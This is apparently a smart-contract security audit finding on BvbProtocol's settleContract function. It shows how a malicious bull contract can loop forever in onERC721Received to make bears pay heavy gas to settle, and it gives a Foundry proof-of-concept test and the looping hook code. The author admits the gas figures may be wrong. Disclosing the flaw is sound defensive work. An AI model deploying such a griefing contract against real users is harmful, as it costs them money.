## Details
# [Medium-1] Due to external call done before state updates, bulls can add extra gas overhead for bears to settle.

## Summary
Due to external calls done before state updates, bulls can add extra gas overhead for bears to settle.

## Vulnerability Detail
Bears can settle contracts through `settleContract()`, by doing the safe transfer of the NFT to the bull.
`BullVsBear` is protected against the vanilla denial of service by malicious bulls where they revert to the hook of `onERC721Received`, but clever bulls can still take advantage of this hook to make bears pay extra gas to settle. 

`settleContract` looks something like this
```solidity
function settleContract(Order calldata order, uint tokenId) public nonReentrant {
    bytes32 orderHash = hashOrder(order);

   ...............................
   ...............................

   ...............................
   ...............................

        // Try to transfer the NFT to the bull (needed in case of a malicious bull that block transfers)
        **try IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}
        catch (bytes memory) {
            // Transfer NFT to BvbProtocol
            IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);
            // Store that the bull has to retrieve it
            withdrawableCollectionTokenId[order.collection][tokenId] = bull;
        }**

        uint bearAssetAmount = order.premium + order.collateral;
        if (bearAssetAmount > 0) {
            // Transfer payment tokens to the Bear
            IERC20(order.asset).safeTransfer(bear, bearAssetAmount);
        }

        settledContracts[contractId] = true;

        emit SettledContract(orderHash, tokenId, order);
    }
```
Our focus is on the try-catch block.
Try tries to do a `safeTrasnfer`, and if failed, it goes to catch.
Now please note from [EIP-150](https://eips.ethereum.org/EIPS/eip-150) a caller can actually only give to a callee, an amount of gas no greater than:

``gas available - (1/64* gas available)``

Hence if `63/64 * gas` is passed to `IERC721(order.collection).safeTransferFrom(bear, bull, tokenId)` and it reverts or goes out of gas
the remaining 1/64 should be able to execute the code from the catch block to settle.

```solidity
				
       catch (bytes memory) {
            // Transfer NFT to BvbProtocol
            IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);
            // Store that the bull has to retrieve it
            withdrawableCollectionTokenId[order.collection][tokenId] = bull;
        }

        uint bearAssetAmount = order.premium + order.collateral;
        if (bearAssetAmount > 0) {
            // Transfer payment tokens to the Bear
            IERC20(order.asset).safeTransfer(bear, bearAssetAmount);
        }

        settledContracts[contractId] = true;

        emit SettledContract(orderHash, tokenId, order);
```
That is, if malicious bull implements an infinite loop inside `onERC721Received` hook and consumes a total of 63/64 gas passed, the remaining 1/64 should be enough to execute the above block.

Due to this, no matter what amount of gas cost is needed until the catch block, one must pass approximately `63 * (gas needed from the catch block)`.

As per my tests, the gas costs needed from the catch block are **107483**

**Verification**
```solidity
Inside Integration.t.sol
  function testMatchingAndContractSettlement(BvbProtocol.Order memory order) public {
        vm.assume(order.premium <= type(uint).max / 1000);
        vm.assume(order.collateral <= type(uint).max / 1000);
        // Build the order
        order.validity = block.timestamp + 1 hours;
        order.expiry = block.timestamp + 1 days;
        order.nonce = 10;
        order.fee = bvb.fee();
        order.maker = bear;
        order.asset = address(usdc);
        order.collection = address(doodles);
        order.isBull = false;

        bytes32 orderHash = bvb.hashOrder(order);

        // Sign the order
        bytes memory signature = signOrderHash(bearPrivateKey, orderHash);

        // Calculate fees
        uint owedFeesBull = (order.collateral * fee) / 1000;
        uint owedFeesBear = (order.premium * fee) / 1000;

        // Give Bull and Bear enough USDC
        deal(address(usdc), bull, order.collateral + owedFeesBull);
        deal(address(usdc), bear, order.premium + owedFeesBear);

        // Initial balances
        uint initialBalanceBull = usdc.balanceOf(bull);
        uint initialBalanceBear = usdc.balanceOf(bear);
        uint initialBalanceBvb = usdc.balanceOf(address(bvb));
        uint initialWithdrawableFees = bvb.withdrawableFees(address(usdc));

        // Approve Bvb to withdraw USDC from Bull and Bear
        vm.prank(bull);
        usdc.approve(address(bvb), type(uint).max);
        vm.prank(bear);
        usdc.approve(address(bvb), type(uint).max);

        // Taker (Bull) match with this order
        vm.prank(bull);
        bvb.matchOrder(order, signature);
        vm.prank(bull);
        bvb.transferPosition(orderHash, true, address(maliciousBull));

        // Give a NFT to the Bear + approve
        uint tokenId = 1234;
        doodles.mint(bear, tokenId);
        vm.prank(bear);
        doodles.setApprovalForAll(address(bvb), true);

        // Settle the contract
        vm.prank(bear);
        bvb.settleContract{gas: 3224490}(order, tokenId);
    }

Inside BvbMaliciousBull.sol
 
function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
 ) external virtual returns (bytes4) {
        while(true)
        {
            
        }
 }
 
Inherit GasHelpers from solmate  for BvbProtocol contract 
and add checkpoints like these inside settle contract 

        try IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {} // @audit gas 
        catch (bytes memory) {
            startMeasuringGas("safeTransferCase");
            // Transfer NFT to BvbProtocol
            IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);
            // Store that the bull has to retrieve it
            withdrawableCollectionTokenId[order.collection][tokenId] = bull;
        }

        uint bearAssetAmount = order.premium + order.collateral;
        if (bearAssetAmount > 0) {
            // Transfer payment tokens to the Bear
            IERC20(order.asset).safeTransfer(bear, bearAssetAmount);
        }

        settledContracts[contractId] = true;

        emit SettledContract(orderHash, tokenId, order);
        stopMeasuringGas();
```    
The output comes something like this

Now if we consider ``63 * 107483`` its 6771429
If we consider the following market condition its 
Gas Price | ETH Price |  
-- | -- | --
40 GWEI | $ 2000 | $ 406.28574

This adds extra overhead for bears to settle the contract, which could be substantial depending on the gas market and the profit amount.

> Please note I thought of this issue in the last hour, so the numbers could be wrong, but I do think it's an issue.
> In the happy case of a settled contract, one only requires 87906 gas,
> In the case of malicious bull, if only 6371429 is passed, it reverts with out of gas, so we can consider this as a point on a range

```bvb.settleContract{gas: 6371429}(order, tokenId);```

## Impact: Medium
Adds extra overhead for bears to close the contract, which could be substantial depending on the gas market and the profit amount.

## Tool used

Manual Review

## Recommendation
Consider moving to try-catch block and thereby external calls to the end, making this attack less attractive.
Or better refractor to pull pattern instead of push, where bull needs to pull nft by themselves.
